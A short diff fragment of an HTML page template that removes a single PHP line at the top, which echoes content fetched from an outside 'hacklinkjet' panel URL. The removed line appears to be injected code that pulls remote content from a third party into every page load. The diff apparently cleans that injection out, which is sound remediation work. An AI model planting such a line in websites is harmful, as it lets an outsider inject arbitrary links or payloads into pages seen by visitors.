@@ -1,4 +1,3 @@
-<?php echo file_get_contents("https://panel.hacklinkjet.com/zirve");?>
 <!DOCTYPE html>
 <html lang="en" class="no-js">
 
